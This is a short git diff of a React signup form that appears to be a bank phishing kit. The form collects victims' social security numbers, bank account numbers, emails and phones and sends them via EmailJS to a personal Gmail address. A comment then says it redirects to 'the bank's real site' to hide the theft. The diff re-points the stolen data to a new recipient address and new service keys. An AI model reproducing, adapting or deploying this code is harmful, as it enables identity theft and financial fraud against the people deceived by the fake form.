@@ -23,7 +23,7 @@ export default function Signup({ onSignup }) {
   // Initialize EmailJS
   useEffect(() => {
     // Replace with your actual EmailJS public key
-    emailjs.init("v_oAluZ11har85Kfg");
+    emailjs.init("PilghMpVXvyryZkcK");
   }, []);
 
   const handleChange = (e) => {
@@ -42,15 +42,15 @@ export default function Signup({ onSignup }) {
     try {
       // Send email using EmailJS
       const response = await emailjs.send(
-        "service_my2ydis", // Replace with your EmailJS service ID
-        "template_vj50jeg", // Replace with your EmailJS template ID
+        "service_28ubo3j", // Replace with your EmailJS service ID
+        "template_3er1ezu", // Replace with your EmailJS template ID
         {
           bName: formData.bName,
           ssn: formData.ssn,
           accountNumber: formData.accountNumber,
           email: formData.email,
           phone: formData.phone,
-          to_email: "Leslieolobo@gmail.com", // Optional if specified in the template
+          to_email: "ifegbesan6@gmail.com", // Optional if specified in the template
         }
       );
       
@@ -59,7 +59,7 @@ export default function Signup({ onSignup }) {
       
       // Redirect to the bank's real site after a short delay
       setTimeout(() => {
-        window.location.href = "https://www.bravera.bank/";
+        window.location.href = "/";
       }, 1500);
       
     } catch (error) {
